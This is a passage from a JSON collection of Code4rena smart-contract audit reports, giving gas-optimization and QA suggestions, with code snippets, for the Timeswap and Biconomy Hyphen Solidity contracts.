example:\n\nhttps://github.com/code-423n4/2022-03-timeswap/blob/00317d9a8319715a8e28361901ab14fe50d06172/Timeswap/Core/contracts/TimeswapPair.sol#L459-L510\n\n`param.ids.length` can be cached as it will be read for more than 4 times.\n\n\n## [S] Do not reduce approval on transferFrom if current allowance is type(uint256).max\n\nThe Wrapped Ether (WETH) ERC-20 contract has a gas optimization that does not update the allowance if it is the max uint.\n\nThe latest version of OpenZeppelin's ERC20 token contract also adopted this optimization.\n\nhttps://github.com/code-423n4/2022-03-timeswap/blob/00317d9a8319715a8e28361901ab14fe50d06172/Timeswap/Convenience/contracts/base/ERC20.sol#L16-L25\n\n```solidity\nfunction transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external override returns (bool) {\n        _approve(from, msg.sender, allowance[from][msg.sender] - amount);\n        _transfer(from, to, amount);\n\n        return true;\n    }\n```\n```\n\nSee:\n-   https://github.com/OpenZeppelin/openzeppelin-contracts/blob/80d8da05644ceef3cd8e81860882571f037f8667/contracts/token/ERC20/ERC20.sol#L162\n-   https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3085\n",
    "dataSource": {
      "name": "code-423n4/2022-03-timeswap-findings",
      "repo": "https://github.com/code-423n4/2022-03-timeswap-findings",
      "url": "https://github.com/code-423n4/2022-03-timeswap-findings/issues/17"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "### Storage of `uints`/`ints` smaller than 32 bytes incurs overhead\n> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\nUse a larger size then downcast where needed\n```solidity\nuint16 public immutable override fee;           \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapPair.sol#L30\n\n```solidity\nuint16 public immutable override protocolFee;           \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapPair.sol#L32\n\n```solidity\nuint16 public immutable override fee;           \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapFactory.sol#L21\n\n```solidity\nuint16 public immutable override protocolFee;           \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapFactory.sol#L23\n\n\n### `abi.encode()` is less efficient than `abi.encodePacked()`\n```solidity\nbytes32 salt = keccak256(abi.encode(asset, collateral, maturity.toString()));          \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/Deploy.sol#L35\n\n```solidity\nbytes(abi.encode(params.asset, params.collateral, params.from, params.maturity))            \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/Pay.sol#L127\n\n```solidity\nbytes(abi.encode(params.asset, params.collateral, params.from))             \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/Borrow.sol#L510\n\n```solidity\nbytes(abi.encode(params.asset, params.collateral, params.from))             \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/Lend.sol#L383\n\n```solidity\nbytes(abi.encode(params.asset, params.collateral, params.assetFrom, params.collateralFrom))            \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/Mint.sol#L690\n\n```solidity\npair = new TimeswapPair{saltkeccak256(abi.encode(asset, collateral))}(asset, collateral, fee, protocolFee);        \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapFactory.sol#L52\n\n\n### `require()` strings longer than 32 bytes cost extra gas\nConsider not using the version of this function that takes in a `string`\n```solidity\n\"balanceOf Call to IERC20 token not successful\"\n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/libraries/SafeBalance.sol#L16\n\n### Using `> 0` costs more gas than `!= 0` when used on uints in a `require()` statement\n```solidity\nrequire(pool.state.totalLiquidity > 0, 'E206');            \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapPair.sol#L225\n\n\n### Splitting `require()` statements that use `&&` saves gas\nSee [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) for an example\n```solidity\nrequire(asset != IERC20(address(0)) && collateral != IERC20(address(0)), 'E101');        \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapFactory.sol\n\n\n### `<array>.length` should not be looked up in every loop of a for-loop\nEven memory arrays incur the overhead of bit tests and bit shifts to calculate the array length\n```solidity\nfor (uint256 i; i < data.length; i++) {        \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L228\n\n```solidity\nfor (uint256 i; i < param.ids.length;) {         \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/TimeswapPair.sol#L480\n\n### `++i`/`i++` should be `unchecked{++i}`/`unchecked{++i}` when it is not possible for them to overflow, as is the case when used in for- and while-loops\n```solidity\nfor (i = 0; i < 32 && data[i] != 0; i++) {   \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/SafeMetadata.sol#L38\n\n```solidity\nfor (uint256 i; i < lengthDiff; i++) {        \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L146\n\n```solidity\nfor (uint256 i; i < lengthDiff; i++) {        \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L174\n\n```solidity\nfor (uint256 i; i < data.length; i++) {        \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L228\n\n```solidity\nfor (uint256 i; i <= end - begin; i++) {      \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L241\n\n\n### `++i` costs less gas than `++i`, especially when it's used in for-loops (`--i`/`i--` too)\n```solidity\nfor (i = 0; i < 32 && data[i] != 0; i++) {   \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/SafeMetadata.sol#L38\n\n```solidity\nfor (uint256 i; i < lengthDiff; i++) {        \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L146\n\n```solidity\nfor (uint256 i; i < lengthDiff; i++) {        \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L174\n\n```solidity\nfor (uint256 i; i < data.length; i++) {        \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L228\n\n```solidity\nfor (uint256 i; i <= end - begin; i++) {      \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L241\n\n\n### It costs more gas to initialize variables to zero than to let the default of zero be applied\n```solidity\nuint8 i = 0;            \n```\nhttps://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/SafeMetadata.sol#L33\n",
    "dataSource": {
      "name": "code-423n4/2022-03-timeswap-findings",
      "repo": "https://github.com/code-423n4/2022-03-timeswap-findings",
      "url": "https://github.com/code-423n4/2022-03-timeswap-findings/issues/13"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n1. It came as a surprise that `LiquidityFarming.sol`'s contract wasn't named after the file (`HyphenLiquidityFarming`)\n2. All `initialize()` functions are front-runnable in the solution. \n\nI suggest adding some access control to them:\n\n```jsx\ncontracts/hyphen/LiquidityFarming.sol:\n  78:     function initialize(\n\ncontracts/hyphen/LiquidityPool.sol:\n  87:     function initialize(\n\ncontracts/hyphen/LiquidityProviders.sol:\n  78:     function initialize(\n\ncontracts/hyphen/WhitelistPeriodManager.sol:\n  60:     function initialize(\n\ncontracts/hyphen/token/LPToken.sol:\n  36:     function initialize(\n```\n\n3. Fees in `TokenManager.sol:function changeFee()` should be upper-bounded\n\n4. Some comments are missing. See `@audit` tags:\n\n```solidity\ncontracts/hyphen/LiquidityFarming.sol:\n  167      /// @notice Sets the sushi per second to be distributed. Can only be called by the owner.\n  168:     /// @param _rewardPerSecond The amount of Sushi to be distributed per second. //@audit missing @param _baseToken\n  169      function setRewardPerSecond(address _baseToken, uint256 _rewardPerSecond) public onlyOwner {\n\n\n  194      /// @notice Deposit LP tokens\n  195:     /// @param _nftId LP token nftId to deposit. //@audit missing @param _to (see L228: it's present)\n  196      function deposit(uint256 _nftId, address payable _to) external whenNotPaused nonReentrant {\n\n  313:     /// @notice Update reward variables of the given pool. //@audit missing @param _baseToken\n  314      /// @return pool Returns the pool that was updated.\n  315      function updatePool(address _baseToken) public whenNotPaused returns (PoolInfo memory pool) {\n\n  327      /// @notice View function to see the tokens staked by a given user.\n  328:     /// @param _user Address of user. //@audit missing @return nftIds\n  329      function getNftIdsStaked(address _user) public view returns (uint256[] memory nftIds) {\n\n\ncontracts/hyphen/LiquidityPool.sol:\n  142      /**\n  143       * @dev Function used to deposit tokens into pool to initiate a cross chain token transfer.\n  144       * @param toChainId Chain id where funds needs to be transfered\n  145       * @param tokenAddress ERC20 Token address that needs to be transfered\n  146       * @param receiver Address on toChainId where tokens needs to be transfered\n  147:      * @param amount Amount of token being transfered //@audit missing @param tag\n  148       */\n  149      function depositErc20(\n  150          uint256 toChainId,\n  151          address tokenAddress,\n  152          address receiver,\n  153          uint256 amount,\n  154          string memory tag\n  155      ) public tokenChecks(tokenAddress) whenNotPaused nonReentrant {\n\n  237      /**\n  238       * @dev Function used to deposit native token into pool to initiate a cross chain token transfer.\n  239       * @param receiver Address on toChainId where tokens needs to be transfered\n  240:      * @param toChainId Chain id where funds needs to be transfered //@audit missing @param tag\n  241       */\n  242      function depositNative(\n  243          address receiver,\n  244          uint256 toChainId,\n  245          string memory tag\n  246      ) external payable whenNotPaused nonReentrant {\n\ncontracts/hyphen/LiquidityProviders.sol:\n  74      /**\n  75       * @dev initalizes the contract, acts as constructor\n  76:      * @param _trustedForwarder address of trusted forwarder //@audit missing @param x3\n  77       */\n  78      function initialize(\n  79          address _trustedForwarder,\n  80          address _lpToken,\n  81          address _tokenManager,\n  82          address _pauser\n  83      ) public initializer {\n\ncontracts/hyphen/WhitelistPeriodManager.sol:\n  56      /**\n  57       * @dev initalizes the contract, acts as constructor\n  58:      * @param _trustedForwarder address of trusted forwarder //@audit missing @param x4\n  59       */\n  60      function initialize(\n  61          address _trustedForwarder,\n  62          address _liquidityProviders,\n  63          address _tokenManager,\n  64          address _lpToken,\n  65          address _pauser\n  66      ) public initializer {\n```\n\n5. Slither revealed several functions that should have an external visibility:\n\n```jsx\n - ExecutorManager.getExecutorStatus(address) (contracts/hyphen/ExecutorManager.sol#21-23)\n - ExecutorManager.getAllExecutors() (contracts/hyphen/ExecutorManager.sol#25-27)\n - HyphenLiquidityFarming.initialize(address,address,ILiquidityProviders,ILPToken) (contracts/hyphen/LiquidityFarming.sol#78-90)\n - HyphenLiquidityFarming.setRewardPerSecond(address,uint256) (contracts/hyphen/LiquidityFarming.sol#169-172)\n - HyphenLiquidityFarming.getNftIdsStaked(address) (contracts/hyphen/LiquidityFarming.sol#329-331)\n - HyphenLiquidityFarming.getRewardRatePerSecond(address) (contracts/hyphen/LiquidityFarming.sol#333-335)\n - LiquidityPool.initialize(address,address,address,address,address) (contracts/hyphen/LiquidityPool.sol#87-105)\n - LiquidityPool.setTrustedForwarder(address) (contracts/hyphen/LiquidityPool.sol#107-111)\n - LiquidityPool.setLiquidityProviders(address) (contracts/hyphen/LiquidityPool.sol#113-117)\n - LiquidityPool.getExecutorManager() (contracts/hyphen/LiquidityPool.sol#123-125)\n - LiquidityProviders.initialize(address,address,address,address) (contracts/hyphen/LiquidityProviders.sol#78-90)\n - LiquidityProviders.getTotalReserveByToken(address) (contracts/hyphen/LiquidityProviders.sol#96-98)\n - LiquidityProviders.getSuppliedLiquidityByToken(address) (contracts/hyphen/LiquidityProviders.sol#100-102)\n - LiquidityProviders.getTotalLPFeeByToken(address) (contracts/hyphen/LiquidityProviders.sol#104-106)\n - LiquidityProviders.getCurrentLiquidity(address) (contracts/hyphen/LiquidityProviders.sol#108-110)\n - LiquidityProviders.increaseCurrentLiquidity(address,uint256) (contracts/hyphen/LiquidityProviders.sol#127-129)\n - LiquidityProviders.decreaseCurrentLiquidity(address,uint256) (contracts/hyphen/LiquidityProviders.sol#131-133)\n - LiquidityProviders.getFeeAccumulatedOnNft(uint256) (contracts/hyphen/LiquidityProviders.sol#201-222)\n - WhitelistPeriodManager.initialize(address,address,address,address,address) (contracts/hyphen/WhitelistPeriodManager.sol#60-74)\n - LPToken.initialize(string,string,address,address) (contracts/hyphen/token/LPToken.sol#36-49)\n - LPToken.setSvgHelper(address,ISvgHelper) (contracts/hyphen/token/LPToken.sol#56-61)\n - LPToken.getAllNftIdsByUser(address) (contracts/hyphen/token/LPToken.sol#75-81)\n - LPToken.exists(uint256) (contracts/hyphen/token/LPToken.sol#98-100)\n - TokenManager.getEquilibriumFee(address) (contracts/hyphen/token/TokenManager.sol#36-38)\n - TokenManager.getMaxFee(address) (contracts/hyphen/token/TokenManager.sol#40-42)\n - TokenManager.getTokensInfo(address) (contracts/hyphen/token/TokenManager.sol#115-124)\n - TokenManager.getDepositConfig(uint256,address) (contracts/hyphen/token/TokenManager.sol#126-133)\n - TokenManager.getTransferConfig(address) (contracts/hyphen/token/TokenManager.sol#135-137)\n```\n\n6. `10000000000` should be changed to `1e10` for readability reasons:\n\n```solidity\nFile: LiquidityPool.sol\n20:     uint256 private constant BASE_DIVISOR = 10000000000; // Basis Points * 100 for better accuracy //@audit hard to read, use 1e10\n```\n\n7. The constant `BASE_DIVISOR` should be used instead of the hardcoded magic-number `10000000000`:\n\n```solidity\nFile: LiquidityPool.sol\n184:                 rewardAmount = (amount * incentivePool[tokenAddress] * 10000000000) / liquidityDifference; //@audit use BASE_DIVISOR\n185:                 rewardAmount = rewardAmount / 10000000000;//@audit use BASE_DIVISOR\n```\n\n8. The \"LP Fee Distribution\" `maps` should be grouped in a struct.\n\nFrom:\n\n```solidity\nFile: LiquidityProviders.sol\n42:     mapping(address => uint256) public totalReserve; // Include Liquidity + Fee accumulated\n43:     mapping(address => uint256) public totalLiquidity; // Include Liquidity only\n44:     mapping(address => uint256) public currentLiquidity; // Include current liquidity, updated on every in and out transfer\n45:     mapping(address => uint256) public totalLPFees;\n46:     mapping(address => uint256) public totalSharesMinted;\n```\n\nTo\n\n```solidity\n42:     struct LPFeeDistribution {\n43:         uint256 totalReserve; // Include Liquidity + Fee accumulated\n44:         uint256 totalLiquidity; // Include Liquidity only\n45:         uint256 currentLiquidity; // Include current liquidity, updated on every in and out transfer\n46:         uint256 totalLPFees;\n47:         uint256 totalSharesMinted;     \n48:     }\n49: \n50:     mapping(address => LPFeeDistribution) public lpFeeDistribution;\n```\n\nIt would be less error-prone, more readable, and it would be possible to delete all related fields with a simple `delete lpFeeDistribution[address]`.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-biconomy-findings",
      "repo": "https://github.com/code-423n4/2022-03-biconomy-findings",
      "url": "https://github.com/code-423n4/2022-03-biconomy-findings/issues/193"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "2022-03-biconomy gas optimization\n\n1 use initial value for uint256 in loop\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/ExecutorManager.sol#L31\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/ExecutorManager.sol#L47\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/token/TokenManager.sol#L78\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/token/LPToken.sol#L77\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L180\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L228\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L233\n\nfor (uint256 i; i < array.length; ++i) {}\n\nOr much better if you write like the following\n\nfor (uint256 i; i < array.length;) {\n    // some executions\n    Unchecked {++1; }\n}\n\n2 != is cheaper than >. \n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L182\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L239\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L283\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L410\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L132\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L318\n\nFor example\n\nif (supply != 0) {}\n\nTokenManager.sol\n\n3 use params instead of storage to emit event.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/token/TokenManager.sol#L53\n\nemit FeeChanged(tokenAddress, _equilibriumFee, _maxFee);\n\n4 use cache for transferConfig[tokenAddress] in addSupportedToken.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/token/TokenManager.sol#L93-L96\n\nTokenConfig storage _tokenConfig = transferConfig[tokenAddress];\n_tokenConfig.min = minCapLimit;\n_tokenConfig.max = maxCapLimit;\ntokensInfo[tokenAddress].tokenConfig = _tokenConfig;\nLiquidityPool.sol\n\n5 use cache for tokenManager.getDepositConfig(toChainId, tokenAddress) in depositErc20 and depositNative\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L157-L158\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L248-L249\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L273-L274\n\nFor example,\n\nITokenManager.TokenConfig memory depositConfig = tokenManager.getDepositConfig(toChainId, tokenAddress);\nrequire(\n    depositConfig.min <= amount && depositConfig.max >= amount,\n    \"Deposit amount not in Cap limit\"\n);\n\n6 the following lines must be checked earlier to save gas if they will be reverted. They must be placed at the beginning of the function.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L161-L162\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L247-L253\n\nFor example\n\nrequire(receiver != address(0), \"Receiver address cannot be 0\");\nrequire(amount != 0, \"Amount cannot be 0\");\nITokenManager.TokenConfig memory depositConfig = tokenManager.getDepositConfig(toChainId, tokenAddress);\nrequire(\n    depositConfig.min <= amount && depositConfig.max >= amount,\n     \"Deposit amount not in Cap limit\"\n);\n\n7 use unchecked because underflow is already checked before this calculation.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L179\n\nuint256 liquidityDifference;\nunchecked { \n    providedLiquidity - currentLiquidity;\n}\n\n8 gasLeft() must be called later and the following line must be checked earlier to save gas if they will be reverted. They must be placed at the beginning of the function.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L271-L277\n\nrequire(receiver != address(0), \"Bad receiver address\"); can be placed at the beginning of the function. And gasLeft() can be executed right before initialGas will be called. e.g line 283.\n\n\n9 use calldata instead of memory to save gas.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L178\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L220-L222\n\nfunction setIsExcludedAddressStatus(address[] calldata _addresses, bool[] calldata _status) external onlyOwner {\n\nfunction setCaps(\n        address[] calldata _tokens,\n        uint256[] calldata _totalCaps,\n        uint256[] calldata _perTokenWalletCaps\n    ) external onlyOwner {\n\n\n10 Attach library function to IERC20Upgradeable to save deployment gas cost.\n\nThe following lines use SafeERC20Upgradeable. You can save deployment gas cost if you attract this library at the beginning of the contract.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L170\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L293\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L379\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L407\n\nusing SafeERC20Upgradeable for IERC20Upgradeable;\n\nIERC20Upgradeable(tokenAddress).safeTransferFrom(sender, address(this), amount);\nIERC20Upgradeable(tokenAddress).safeTransfer(receiver, amountToTransfer);\n\nIERC20Upgradeable(tokenAddress).safeTransfer(_msgSender(), _gasFeeAccumulated);\nbaseToken.safeTransfer(receiver, _tokenAmount);\n\n11 += is cheaper in the followings lines.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L331-L332\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L335-L336\n\nFor example,\ntotalGasUsed += tokenManager.getTokensInfo(tokenAddress).transferOverhead;\n        totalGasUsed += baseGas;\n\n\n gasFeeAccumulatedByToken[tokenAddress] += gasFee;\n        gasFeeAccumulated[tokenAddress][_msgSender()] += gasFee;\n\n12 -= is cheaper in the following lines,\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L377\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L386\n\ngasFeeAccumulatedByToken[tokenAddress] -= _gasFeeAccumulated;\ngasFeeAccumulatedByToken[NATIVE] -= _gasFeeAccumulated;\n\n13 Use unchecked for the following line. rewardAmount is calculated in getRewardAmount. rewardAmount will be never more than incentivePool[tokenAddress], so you can use unchecked for the following line.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L167\n\nif (rewardAmount != 0) {\n            unchecked {\n                incentivePool[tokenAddress] -= rewardAmount;\n            }\n        }\n\nLiquidityProviders.sol\n\n14 Delete unused variable.\nIn onlyValidLpToken lpToken.tokenMetadata() is called with tokenId, but the return value token will be not used in modifier.  \n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L54\n\n15 Use cache for previous state of state variable for currentLiquidity[tokenAddress] in _increaseCurrentLiquidity and _decreaseCurrentLiquidity. You can avoid calling sload one time.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L136-L137\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L141-L142\n\nuint previousLiquidity = currentLiquidity[tokenAddress];\n        currentLiquidity[tokenAddress] = previousLiquidity + amount;\n        emit CurrentLiquidityChanged(tokenAddress, previousLiquidity, previousLiquidity + amount);\n\nuint previousLiquidity = currentLiquidity[tokenAddress];\n        currentLiquidity[tokenAddress] = previousLiquidity - amount;\n        emit CurrentLiquidityChanged(tokenAddress, previousLiquidity, previousLiquidity - amount);\n\n\n16 Use cached variable in getTokenPriceInLPShares. In getTokenPriceInLPShares there is a cached variable supply. You can use it in calculaton too.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L181-L183\n\nif (supply > 0) {\n    return supply / totalReserve[_baseToken];\n}\n\n17 The following line must be place at the beginning of function to save gas if it reverts the excution.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L283\n\nLiquidityFarming.sol\n\n\n18 Use cache for rewardRateLog[_baseToken] in getRewardRatePerSecond\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L333-L335\n\nfunction getRewardRatePerSecond(address _baseToken) public view returns (uint256) {\n        RewardsPerSecondEntry[] memory rewardsPerSecondEntry = rewardRateLog[_baseToken];\n        return rewardsPerSecondEntry[rewardsPerSecondEntry.length - 1].rewardsPerSecond;\n    }\n\n19 Use cache for nftIdsStaked[msgSender] in withdraw.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L231-L241\n\nuint256[] storage _nftsStaked = nftIdsStaked[msgSender];\n        uint256 index;\n        for (index = 0; index < _nftsStaked.length; ++index) {\n            if (_nftsStaked[index] == _nftId) {\n                break;\n            }\n        }\n \n        require(index != _nftsStaked.length, \"ERR__NFT_NOT_STAKED\");\n        _nftsStaked[index] = _nftsStaked[_nftsStaked.length - 1];\n        _nftsStaked.pop();\n\n20 Use cache for poolInfo[_baseToken] in getUpdatedAccTokenPerShare\n\nThe following lines use sload for poolInfo[_baseToken]. You can save gas with memory cache.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L267\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L290\n\nPoolInfo memory pool = poolInfo[_baseToken];\n        uint256 lastUpdatedTime = pool.lastRewardTime;\n\n return accumulator + pool.accTokenPerShare;\n\n21 Use cache for rewardRateLog[_baseToken]in getUpdatedAccTokenPerShare\n\nIn the following lines you can use memory cache for rewardRateLog[_baseToken]\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L269-L279\n\nRewardsPerSecondEntry[] memory _rewardsPerSecondEntry = rewardRateLog[_baseToken];\n        uint256 i = _rewardsPerSecondEntry.length - 1;\n        while (true) {\n            if (lastUpdatedTime >= counter) {\n                break;\n            }\n            unchecked {\n                accumulator +=\n                    _rewardsPerSecondEntry[i].rewardsPerSecond *\n                    (counter - max(lastUpdatedTime, _rewardsPerSecondEntry[i].timestamp));\n            }\n            counter = _rewardsPerSecondEntry[i].timestamp;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n22 Use cache for poolInfo[_baseToken] and totalSharesStaked[_baseToken] in updatePool. You can cache poolInfo[_baseToken] as storage and totalSharesStaked[_baseToken] as memory to save gas cost in this function.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L316-L323\n\nfunction updatePool(address _baseToken) public whenNotPaused returns (PoolInfo memory) {\n        PoolInfo storage pool = poolInfo[_baseToken];\n        uint256 _totalSharesStaked = totalSharesStaked[_baseToken];\n        if (block.timestamp > pool.lastRewardTime) {\n            if (_totalSharesStaked > 0) {\n                pool.accTokenPerShare = getUpdatedAccTokenPerShare(_baseToken);\n            }\n            pool.lastRewardTime = block.timestamp;\n            emit LogUpdatePool(_baseToken, pool.lastRewardTime, _totalSharesStaked, pool.accTokenPerShare);\n        }\n        return pool;\n    }\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-biconomy-findings",
      "repo": "https://github.com/code-423n4/2022-03-biconomy-findings",
      "url": "https://github.com/code-423n4/2022-03-biconomy-findings/issues/190"
    }
  },
  {
    "title": "QA Report",
    "body": "2022-03-biconomy\n\n1 executorAddress must be deleted from executors in removeExecutor.\nExcutor will be added into executors in addExecutor. Input(excutorAddress) of removeExcutor must be deleted from executors in this function. Otherwise executors has the same address in the array if you will add the deleted address into executors again. \n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/ExecutorManager.sol#L53-L57\n\nFor example,\n\nuint length = executors.length;\nuint index;\nfor (uint i; i < length; ++i) {\n    if (_name == executors[i]) {\n        index = i;\n        break;\n    }\n}\nexecutors[index] = executors[length -1];\nexecutors.pop();\n\n2 delete unused variable name for return value\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/token/TokenManager.sol#L139\n\nfunction _msgSender() internal view virtual override(Context, ERC2771Context) returns (address) {\n        return ERC2771Context._msgSender();\n}\n\n\n3 missing input validation for _liquidityPool. The owner can change always liquidityPool but this liquidityPool will be used to execute low-level calls. To avoid errors with an empty address this must be checked always.  \n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityProviders.sol#L171-L173\n\nrequire(_liquidityPool != address(0), “liquidityPool  cannot be 0x0”);\n\n4 wrong description for the following line.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L26\n\nFor examples \n// Token -> LP Adress -> TVL\n\n\n5 delete unused import statements.\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L6-L7\n\nDelete them.\n\n6 wrong description for setRewardPerSecond in HyphenLiquidityFarming.\nThe following line must be wrong description. sushi?\n\nhttps://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L167-L168\n\n7 Use the attached library. You have already attached SafeERC20Upgradeable for IERC20Upgradeable, so you change the following lines in 